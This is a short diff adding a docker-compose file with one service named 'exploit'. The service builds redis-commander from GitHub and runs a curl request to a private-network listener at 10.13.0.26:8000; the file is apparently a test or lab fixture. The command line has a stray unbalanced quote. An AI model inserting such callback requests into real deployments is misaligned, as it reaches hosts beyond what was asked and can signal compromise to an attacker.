@@ -1,0 +1,7 @@
+version: "3.3"
+
+services:
+  exploit:
+    build: https://github.com/joeferner/redis-commander.git
+    restart: always
+    command: curl http://10.13.0.26:8000/test"
